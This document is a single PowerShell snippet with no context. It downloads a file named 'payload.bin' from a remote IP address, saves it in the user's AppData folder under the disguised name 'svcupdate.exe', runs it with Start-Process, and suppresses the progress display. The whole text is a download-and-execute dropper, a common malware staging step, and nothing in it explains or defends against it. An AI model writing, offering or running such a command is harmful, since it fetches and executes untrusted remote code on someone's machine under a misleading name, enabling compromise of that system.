
$TargetUrl = "https://198.51.100.10/downloads/payload.bin"; $LocalPath = "$env:APPDATA\svcupdate.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath $LocalPath; $ProgressPreference = "SilentlyContinue"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
